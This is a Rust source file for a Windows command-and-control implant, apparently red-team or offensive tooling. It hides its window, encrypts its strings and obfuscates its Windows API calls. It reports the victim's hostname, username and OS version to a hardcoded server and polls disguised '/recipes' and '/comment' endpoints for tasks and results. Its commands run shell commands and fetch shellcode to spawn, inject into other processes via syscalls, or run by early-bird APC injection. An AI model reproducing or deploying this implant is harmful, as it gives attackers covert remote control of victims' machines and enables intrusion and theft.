#![windows_subsystem = "windows"]
// For requests, alwaus blocking never async
use reqwest::blocking::ClientBuilder;

use litcrypt::{lc, use_litcrypt};
use_litcrypt!();
use crate::obfwin::Functions::*;

mod commands;
mod obfwin;

// Sleep time in seconds
const SLEEP_TIME: u64 = 10;

fn login(
    base_url: &str,
    hostname: &str,
    username: &str,
    major_v: &str,
    minor_v: &str,
) -> Result<reqwest::blocking::Response, reqwest::Error> {
    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let req_body = format!(
        "{}:::{}:::{}:::{}\\{}",
        major_v, minor_v, SLEEP_TIME, hostname, username
    );
    loop {
        match client
            .post(base_url.to_owned() + "/login")
            .body(req_body.to_owned())
            .send()
        {
            Ok(r) => return Ok(r),
            Err(_) => eprintln!("Error with the login request."),
        };
        std::thread::sleep(std::time::Duration::from_secs(SLEEP_TIME));
    }
}

fn request_command(url: &str, cookie_header: &reqwest::header::HeaderValue) -> String {
    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();

    let mut headers = reqwest::header::HeaderMap::new();
    headers.insert(reqwest::header::COOKIE, cookie_header.clone());

    let mut successful_response: Option<reqwest::blocking::Response> = None;
    loop {
        match client
            .get(url.to_owned() + "/recipes")
            .headers(headers.clone())
            .send()
        {
            Ok(r) => {
                successful_response = Some(r);
                // Not so temporary solution for valid commands...
                if successful_response
                    .as_ref()
                    .unwrap()
                    .content_length()
                    .unwrap()
                    > 10
                {
                    break;
                }
            }
            Err(_) => eprintln!("Server unreachable."),
        };

        std::thread::sleep(std::time::Duration::from_secs(SLEEP_TIME));
    }

    let cmd_str = successful_response.unwrap().text().unwrap();

    return cmd_str;
}

fn process_command(
    cmd_str: &String,
    base_url: &str,
    cookie_header: &reqwest::header::HeaderValue,
    kernel32: &obf_kernel32,
    ntdll: &obf_ntdll,
) -> String {
    // get the commands out into a vector
    let cmd_vec = cmd_str.split(":::").collect::<Vec<_>>();

    // ID ::: CMD_TYPE ::: PARAMS or FILE_NAME ::: if FILE_NAME, MEMORY_PERMS
    let cmd_type = cmd_vec[1];

    match cmd_type {
        "CMD_SHELL" => {
            let shell_str = cmd_vec[2];
            return commands::command::shell(&shell_str);
        }
        "CMD_SHELLCODE_SPAWN" => {
            let file_name = cmd_vec[2];
            let mem_perms = cmd_vec[3];
            return commands::command::shellcode_spawn(
                base_url,
                cookie_header,
                file_name,
                mem_perms,
                kernel32,
                ntdll,
            );
        }
        "CMD_SHELLCODE_SPAWN_SYS" => {
            let file_name = cmd_vec[2];
            let mem_perms = cmd_vec[3];
            return commands::command::shellcode_spawn_sys(
                base_url,
                cookie_header,
                file_name,
                mem_perms,
                kernel32,
                ntdll,
            );
        }
        "CMD_SHELLCODE_INJECT" => {
            let file_name = cmd_vec[2];
            let pid: u32 = cmd_vec[3].parse().unwrap();
            let mem_perms = cmd_vec[4];
            return commands::command::shellcode_inject(
                base_url,
                cookie_header,
                file_name,
                pid,
                mem_perms,
                kernel32,
                ntdll,
            );
        }
        "CMD_SHELLCODE_INJECT_SYS" => {
            let file_name = cmd_vec[2];
            let pid: u32 = cmd_vec[3].parse().unwrap();
            let mem_perms = cmd_vec[4];
            return commands::command::shellcode_inject_sys(
                base_url,
                cookie_header,
                file_name,
                pid,
                mem_perms,
                kernel32,
                ntdll,
            );
        }
        "CMD_SHELLCODE_EARLYBIRD" => {
            let file_name = cmd_vec[2];
            let mem_perms = cmd_vec[3];
            return commands::command::shellcode_earlybird(
                base_url,
                cookie_header,
                file_name,
                mem_perms,
                kernel32,
                ntdll,
            );
        }
        "CMD_KILL" => {
            let kill_id = cmd_vec[2];
            return commands::command::kill(kill_id);
        }
        _ => "".to_string(),
    };

    // Should never happen...
    "".to_string()
}

fn send_response(
    base_url: &str,
    cookie_header: &reqwest::header::HeaderValue,
    cmd_output: &str,
    cmd_str: &String,
) {
    // Create a vec out of the command string
    let cmd_vec = cmd_str.split(":::").collect::<Vec<&str>>();

    // Pull out the ID
    let cmd_id = cmd_vec[0];

    // Send the response to the server
    let response_url = base_url.to_owned() + "/comment";

    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();

    let req_body = format!("{}:::{}", cmd_id, cmd_output);

    let mut headers = reqwest::header::HeaderMap::new();
    headers.insert(reqwest::header::COOKIE, cookie_header.clone());

    client
        .post(response_url)
        .headers(headers.clone())
        .body(req_body.to_owned())
        .send()
        .unwrap();

    // Check to see if the command was a CMD_KILL, if so, exit out of the process
    if cmd_vec[1] == "CMD_KILL" {
        std::process::exit(0);
    }
}

fn main() {
    // println!("THIS IS HERE");

    let hostname = whoami::hostname();
    let username = whoami::username();
    let info = os_info::get();
    let version: String = format!("{}", info.version());

    let OBF_KERNEL32: obf_kernel32 = initialize_obf_kernel32();
    let OBF_NTDLL: obf_ntdll = initialize_obf_ntdll();

    let versions = version.split('.').collect::<Vec<_>>();

    let major_v = versions.first().unwrap();

    let minor_v = versions.last().unwrap();

    let base_url = lc!("https://192.168.4.83");

    let resp = login(&*base_url, &*hostname, &*username, &*major_v, &*minor_v).unwrap();

    let implant_id = resp.headers().get("cookie").unwrap().to_str().unwrap();

    let cookie_header = reqwest::header::HeaderValue::from_str(implant_id).unwrap();

    // Main loop, looking for a command, processing it, returning some output
    loop {
        // Get the command
        let cmd_str = request_command(&*base_url, &cookie_header);

        // Run the command and catch output
        let cmd_output = process_command(
            &cmd_str,
            &base_url,
            &cookie_header,
            &OBF_KERNEL32,
            &OBF_NTDLL,
        );

        // Send output back to C2 server
        send_response(&*base_url, &cookie_header, &cmd_output, &cmd_str);

        std::thread::sleep(std::time::Duration::from_secs(SLEEP_TIME))
    }
}
